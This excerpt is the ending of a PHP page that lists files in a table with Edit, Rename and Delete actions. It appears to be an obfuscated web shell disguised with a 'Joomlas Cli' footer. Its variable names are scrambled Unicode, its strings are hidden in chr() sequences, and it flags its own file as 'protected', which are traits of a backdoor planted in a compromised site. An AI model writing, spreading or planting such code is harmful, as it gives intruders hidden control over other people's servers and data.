                    $㉉̉ᛚ̣ᛉ̀ = $㦁̩̉ﬗ̦̀ ? chr(105).chr(99).chr(111).chr(110).chr(45).chr(114).chr(101).chr(97).chr(100).chr(97).chr(98).chr(108).chr(101) : chr(105).chr(99).chr(111).chr(110).chr(45).chr(117).chr(110).chr(114).chr(101).chr(97).chr(100).chr(97).chr(98).chr(108).chr(101);
                    $ᚢ̧́̊ = $㦁̩̉ﬗ̦̀ ? '📄' : chr(240).chr(159).chr(148).chr(146).chr(240).chr(159).chr(147).chr(132);
                    $㼁ᛊ̦̥̆̃ = filesize($㉆́̅̋̇̈);
                    $ᚨ̥̤̆̋ = filemtime($㉆́̅̋̇̈);
                    $㼁̦̦̀̊̆̊ = (realpath($㉆́̅̋̇̈) === realpath($ﬕ̦ま̣̈́));
                ?>
                    <tr>
                        <td class="file-name">
                            <span class="<?= $㉉̉ᛚ̣ᛉ̀ ?>"><?= $ᚢ̧́̊ ?></span>
                            <?= htmlspecialchars($ﬆᛇ̧̧̂̅̆) ?>
                            <?php if ($㼁̦̦̀̊̆̊): ?> <span class="badge" style="background:#ffedd5;">🔒 protected</span><?php endif; ?>
                            <?php if (!$㦁̩̉ﬗ̦̀): ?> <span class="badge" style="background:#fee2e2; color:#b91c1c;">🔴 unreadable</span><?php endif; ?>
                        </td>
                        <td><span class="badge">File</span></td>
                        <td><?= getHumanSize($㼁ᛊ̦̥̆̃) ?></td>
                        <td><?= formatTimestamp($ᚨ̥̤̆̋) ?></td>
                        <td class="action-buttons">
                            <?php if ($㦁̩̉ﬗ̦̀): ?>
                                <a href="?dir=<?= urlencode($ᛃ̊ᛉねﬔ̅̃̋) ?>&edit=<?= urlencode($ﬆᛇ̧̧̂̅̆) ?>" class="btn-edit">✍ Edit</a>
                            <?php else: ?>
                                <span class="badge" style="background:#e2e3e5; color:#6c757d;">🚫 Edit blocked</span>
                            <?php endif; ?>
                            <a href="?dir=<?= urlencode($ᛃ̊ᛉねﬔ̅̃̋) ?>&rename=<?= urlencode($ﬆᛇ̧̧̂̅̆) ?>" class="btn-rename">🏷 Rename</a>
                            <a href="?dir=<?= urlencode($ᛃ̊ᛉねﬔ̅̃̋) ?>&delete=<?= urlencode($ﬆᛇ̧̧̂̅̆) ?>" class="btn-delete" onclick="return confirm('Delete this file?');">❌ Delete</a>
                        </td>
                    </tr>
                <?php endforeach; ?>
            </tbody>
        </table>
    </div>
    <footer>
        Joomlas Cli
    </footer>
</div>
</body>
</html>
